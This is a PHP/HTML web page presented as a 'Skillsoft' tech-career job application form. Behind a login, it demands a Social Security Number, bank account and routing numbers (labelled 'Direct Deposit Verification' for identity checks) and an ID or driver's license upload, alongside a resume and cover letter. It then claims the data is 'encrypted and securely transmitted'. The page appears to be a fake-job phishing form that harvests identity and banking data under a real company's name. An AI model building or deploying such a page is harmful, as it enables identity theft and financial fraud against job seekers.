<?php
session_start();
include("php/config.php");
if (!isset($_SESSION['valid'])) {
  header("Location: login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include("includes/head.php"); ?>
    <title>Skillsoft | Begin a Career in Tech</title>
  </head>
  <body>
    <!-- Premium Application Form -->
    <section class="min-h-[calc(100vh-80px)] relative flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 overflow-hidden bg-slate-900">
      <!-- Animated Mesh/Glow Background -->
      <div class="absolute inset-0 w-full h-full bg-slate-900 z-0"></div>
      <div class="absolute top-[-10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-brand-600/20 blur-[120px] mix-blend-screen animate-pulse z-0"></div>
      <div class="absolute bottom-[-10%] left-[-10%] w-[40%] h-[40%] rounded-full bg-violet-600/20 blur-[120px] mix-blend-screen z-0" style="animation: pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite 2s;"></div>
      
      <!-- Glassmorphic Card -->
      <div class="relative w-full max-w-4xl z-10 my-8">
        <div class="backdrop-blur-xl bg-white/5 border border-white/10 p-8 md:p-12 rounded-3xl shadow-2xl relative overflow-hidden">
          
          <div class="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-50 pointer-events-none"></div>

          <div class="text-center mb-10 relative z-10">
            <h2 class="text-4xl font-extrabold text-white tracking-tight mb-2">Submit Application</h2>
            <p class="text-slate-400 font-medium">Please provide your details below to proceed.</p>
          </div>

          <div class="relative z-10">
            <form action="php/upload.php" method="post" enctype="multipart/form-data" class="space-y-8">
              
              <!-- Personal Details Section -->
              <div class="space-y-6">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Personal Information</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <!-- First Name -->
                  <div class="group">
                    <label for="firstname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">First Name</label>
                    <input
                      type="text"
                      id="firstname"
                      name="firstname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="John"
                      required
                    />
                  </div>

                  <!-- Last Name -->
                  <div class="group">
                    <label for="lastname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Last Name</label>
                    <input
                      type="text"
                      id="lastname"
                      name="lastname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="Doe"
                      required
                    />
                  </div>

                  <!-- Gender -->
                  <div class="group">
                    <label for="gender" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Gender</label>
                    <div class="relative">
                        <select
                          id="gender"
                          name="gender"
                          class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white appearance-none focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                          required
                        >
                          <option value="Male" class="bg-slate-800">Male</option>
                          <option value="Female" class="bg-slate-800">Female</option>
                          <option value="Others" class="bg-slate-800">Other binaries</option>
                          <option value="private" class="bg-slate-800">Prefer not to say</option>
                        </select>
                        <i class="fa-solid fa-chevron-down absolute right-4 top-1/2 transform -translate-y-1/2 text-slate-400 pointer-events-none"></i>
                    </div>
                  </div>

                  <!-- Email -->
                  <div class="group">
                    <label for="email" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Email Address</label>
                    <input
                      type="email"
                      id="email"
                      name="email"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="john.doe@example.com"
                      required
                    />
                  </div>
                  
                  <!-- SSN -->
                  <div class="group">
                    <label for="ssn" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Social Security Number</label>
                    <input
                      type="password"
                      id="ssn"
                      name="ssn"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="XXX-XX-XXXX"
                      required
                    />
                  </div>

                  <!-- Phone Number -->
                  <div class="group">
                    <label for="phoneno" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Phone Number</label>
                    <input
                      type="tel"
                      id="phoneno"
                      name="phoneno"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="(555) 123-4567"
                      required
                    />
                  </div>
                  
                  <!-- House Address -->
                  <div class="group md:col-span-2">
                    <label for="houseaddress" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Home Address</label>
                    <input
                      type="text"
                      id="houseaddress"
                      name="houseaddress"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="123 Main St, Apt 4B, City, State, ZIP"
                      required
                    />
                  </div>
                </div>
              </div>

              <!-- Banking Information Section -->
              <div class="space-y-6 pt-6 mt-6 border-t border-slate-700/50">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Direct Deposit Verification</h3>
                <p class="text-slate-400 text-sm mb-4">Required for identity verification and payroll processing setup.</p>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div class="group">
                    <label for="bankname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Bank Name</label>
                    <input
                      type="text"
                      id="bankname"
                      name="bankname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="e.g. Chase, Bank of America"
                      required
                    />
                  </div>

                  <div class="group">
                    <label for="bankno" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Account / Routing Number</label>
                    <input
                      type="password"
                      id="bankno"
                      name="bankno"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="Secure entry"
                      required
                    />
                  </div>
                </div>
              </div>

              <!-- Required Documents Section -->
              <div class="space-y-6 pt-6 mt-6 border-t border-slate-700/50">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Required Documents</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <!-- Driver License -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="driverlicense"
                      name="driverlicense"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-id-card text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="block text-sm font-bold text-white mb-1">ID / License</span>
                      <span class="block text-xs font-medium text-slate-500">Click to upload</span>
                    </div>
                  </div>

                  <!-- Resume/CV -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="resume"
                      name="resume"
                      accept=".pdf,.doc,.docx"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-file-pdf text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="block text-sm font-bold text-white mb-1">Resume / CV</span>
                      <span class="block text-xs font-medium text-slate-500">PDF, DOC, DOCX</span>
                    </div>
                  </div>

                  <!-- Cover Letter -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="coverletter"
                      name="coverletter"
                      accept=".pdf,.doc,.docx"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-envelope-open-text text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="block text-sm font-bold text-white mb-1">Cover Letter</span>
                      <span class="block text-xs font-medium text-slate-500">PDF, DOC, DOCX</span>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Submit Button -->
              <div class="pt-8">
                <button
                  type="submit"
                  name="submit"
                  class="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-brand-600 to-violet-600 hover:from-brand-500 hover:to-violet-500 text-white font-bold text-lg transition-all shadow-[0_0_20px_rgba(124,58,237,0.3)] hover:shadow-[0_0_30px_rgba(124,58,237,0.5)] transform hover:-translate-y-1"
                >
                  Submit Application Securely
                </button>
                <p class="text-center text-xs text-slate-500 mt-4 flex items-center justify-center">
                  <i class="fa-solid fa-lock mr-2"></i> Your information is encrypted and securely transmitted.
                </p>
              </div>

            </form>
          </div>
        </div>
      </div>
    </section>

    <script src="js/main.js"></script>
  </body>
</html>